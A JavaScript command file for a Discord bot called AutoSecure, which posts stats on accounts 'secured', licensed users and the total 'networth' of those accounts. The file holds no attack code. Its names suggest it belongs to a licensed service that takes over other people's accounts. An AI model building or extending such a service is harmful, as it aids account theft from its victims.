const shorten = require("../../../autosecure/utils/utils/shorten");
const { queryParams } = require("../../../db/database");
module.exports = {
    name: "info",
    description: "See autosecure stats",
    callback: async (client, interaction) => {
        try {

            await interaction.deferReply({ ephemeral: true });
           
            const accountsSecured = await queryParams(
                "SELECT COUNT(*) as count FROM accounts",
                []
            );
           
            const totalUsers = await queryParams(
                "SELECT COUNT(*) as count FROM usedLicenses",
                []
            );
            const networthResult = await queryParams(
                "SELECT COALESCE(SUM(networth), 0) as totalNetworth FROM leaderboard",
                []
            );
            

            const securedAmountResult = await queryParams(
                "SELECT COALESCE(SUM(amount), 0) as securedAmount FROM leaderboard",
                []
            );
           
            const totalAccountsSecured = accountsSecured[0].count.toLocaleString();
            const userCount = totalUsers[0].count.toLocaleString();
            const totalNetworth = shorten(networthResult[0].totalNetworth);
            const securedXAmount = shorten(securedAmountResult[0].securedAmount);
           
            const startDate = "4/5/2025";
            const today = new Date();
            const formattedToday = today.toLocaleDateString('en-US');
           
            const start = new Date(startDate);
            const diffTime = Math.abs(today - start);
            const diffDays = Math.ceil(diffTime / (1000 * 60 * 60 * 24));
           
            const fields = [
                {
                    name: 'Accounts Secured',
                    value: `\`\`\`${securedXAmount}\`\`\``,
                    inline: true
                },
                {
                    name: 'Total Users',
                    value: `\`\`\`${userCount}\`\`\``,
                    inline: true
                },
                {
                    name: 'Days Running',
                    value: `\`\`\`${diffDays}\`\`\``,
                    inline: true
                },
                {
                    name: 'Total Networth',
                    value: `\`\`\`${totalNetworth}\`\`\``,
                    inline: true
                },
                {
                    name: 'Start Date',
                    value: `\`\`\`${startDate}\`\`\``,
                    inline: true
                },
                {
                    name: 'Current Date',
                    value: `\`\`\`${formattedToday}\`\`\``,
                    inline: true
                }
            ];
           
            const { EmbedBuilder } = require('discord.js');
            const embed = new EmbedBuilder()
                .setTitle('AutoSecure Stats')
                .setColor(11393254)
                .addFields(fields);
            await interaction.editReply({ embeds: [embed] });
           
        } catch (error) {
            console.error("Error in info command:", error);
           
            if (interaction.deferred || interaction.replied) {
                await interaction.editReply({
                    content: "Error occurred",
                    ephemeral: true
                });
            } else {
                await interaction.reply({
                    content: "An error occurred, contact an admin.",
                    ephemeral: true
                });
            }
        }
    }
};